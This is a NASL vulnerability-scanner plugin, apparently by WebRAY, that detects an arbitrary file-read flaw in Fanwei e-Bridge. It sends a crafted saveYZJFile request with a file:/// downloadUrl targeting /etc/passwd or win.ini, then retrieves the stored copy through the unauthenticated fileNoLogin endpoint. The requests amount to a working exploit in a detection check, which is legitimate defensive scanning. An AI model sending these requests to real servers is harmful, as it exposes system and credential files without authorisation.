############################################################
# Author: ox50sec@webray.com.cn
# Copyright @WebRAY
############################################################
include("compat.inc");


if (description)
{
  script_id(51799288);
  script_version("1.3");
  script_name(english:"fanwei-ebridge-filereaad");
  script_summary(english:"fanwei-ebridge-filereaad");
  script_set_attribute(attribute:"risk_factor", value:"High");
  script_set_attribute(attribute:"description", value:"fanwei-ebridge-filereaad");
  script_set_attribute(attribute:"solution", value:"update system");
  script_set_attribute(attribute:"vuln_publication_date",value:"2018/10/11");
  script_set_attribute(attribute:"patch_publication_date",value:"2018/10/11");
  script_set_attribute(attribute:"plugin_publication_date", value:"2018/10/22");
  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"in_the_news", value:"true");
  script_end_attributes();
  script_family(english:"Web Servers");
  script_dependencies("find_service.nasl", "http_version.nasl");
  script_category(ACT_ATTACK);
  script_copyright(english:"This script is Copyright (C) WebRAY, Inc.");
  script_require_ports("Services/www", 80, 443);
  exit(0);
}



include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("json.inc");
include("openvas-https2.inc");

paths = make_list("etc/passwd","c://windows/win.ini");

function check_vuln(port){
		foreach path (paths){
			url = "/wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///"+path+"&fileExt=txt";
			req = http_send_recv3(method: "GET", port: port, item: url, add_headers: make_array("User_Agent", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0","Content-Type","application/x-www-form-urlencoded"));
			if("200 O">< req[0] && '"filepath"' >< req[2] && '"id"' >< req[2] && "isencrypt" >< req[2]){
				prefs = json_read(req[2]);
				read_url = "/file/fileNoLogin/"+string(prefs[0]['id']);
				res = http_send_recv3(method: "GET", port: port, item: read_url, add_headers: make_array("User_Agent", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0","Content-Type","application/x-www-form-urlencoded"));
				if("200 O">< res[0] && ("root:x:0:0:root:/root" >< res[2] || "; for 16-bit app support" >< res[2]))
					security_hole(port:port, extra:res[2]);
			}
		
		}
}

function check_vuln_ssl(port){
		foreach path (paths){
			url = "/wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///"+path+"&fileExt=txt";
			res = http_get(item:url, port:port);
			ssl_req = https_req_get(port:port , request:res);
			if("200 O">< ssl_req && '"filepath"' >< ssl_req && '"id"' >< ssl_req && "isencrypt" >< ssl_req){
				security_hole(port:port, extra:ssl_req);
			}
		}
}
##################################
kbs = get_kb_list("www/banner/*");
foreach k (keys(kbs)) {
	port = substr(k,11);
	ssl = get_kb_list("SSL/Transport/"+port);
	if(!ssl) {
   		check_vuln(port:port);
	} else {
   		check_vuln_ssl(port:port);
	}
}
